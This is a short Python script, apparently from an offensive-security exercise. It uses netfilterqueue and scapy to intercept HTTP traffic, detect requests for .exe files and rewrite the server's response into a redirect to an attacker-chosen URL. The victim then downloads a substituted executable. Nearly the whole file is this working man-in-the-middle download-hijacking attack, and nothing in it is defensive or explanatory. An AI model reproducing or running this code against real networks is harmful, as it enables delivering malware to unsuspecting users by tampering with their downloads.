#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import optparse
import netifaces as ni


parser = optparse.OptionParser()
parser.add_option("-s", "--spoof", dest="spoof", help="URL address for spoofing .exe file")
(options, arguments) = parser.parse_args()
url = options.spoof
ack_list = []
webserver_ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet and webserver_ip not in str(scapy_packet.load):
        if scapy_packet.dport == 80:
            if ".exe" in str(scapy_packet[scapy.Raw].load):
                print("[+] HTTP REQUEST FOR .EXE FILE WAS DETECTED")
                ack_list.append(str(scapy_packet.ack))
        if scapy_packet.sport == 80:
            if str(scapy_packet.seq) in ack_list:
                ack_list.remove(str(scapy_packet.seq))
                print("[+] REPLACING FILE")
                scapy_packet[scapy.Raw].load = 'HTTP/1.1 301 Moved Permanently\r\nLocation: ' + url + '\r\n'
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(bytes(scapy_packet))
                print("[+] FILE WAS SUCCESSFULLY REPLACED")
    packet.accept()


queuee = netfilterqueue.NetfilterQueue()
print("[+] File interceptor started to " + url)
queuee.bind(0, process_packet)
queuee.run()
